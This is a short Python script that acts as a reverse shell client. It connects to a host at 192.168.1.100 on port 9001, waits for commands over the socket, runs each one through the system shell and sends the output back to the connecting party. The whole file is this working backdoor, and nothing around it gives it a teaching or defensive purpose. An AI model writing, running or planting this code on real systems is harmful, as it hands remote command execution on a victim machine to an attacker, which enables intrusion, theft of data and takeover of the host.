from asyncio.subprocess import STDOUT
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.100', 9001))

while True:
  command = s.recv(1024).decode()

  if command == 'exit':
    s.close()
  else:
    CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=STDOUT)
    s.send(CMD.stdout)
